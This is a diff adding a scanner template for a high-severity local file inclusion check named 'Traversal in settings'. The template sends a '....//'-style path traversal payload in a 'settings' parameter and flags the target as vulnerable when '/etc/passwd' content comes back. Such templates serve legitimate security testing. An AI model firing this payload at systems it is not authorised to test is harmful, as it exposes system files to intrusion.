@@ -1,0 +1,20 @@
+id: lfi6-1324
+name: 'Traversal in settings'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via settings'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      settings:
+        - '....//....//....//....//....//....//....//....//etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
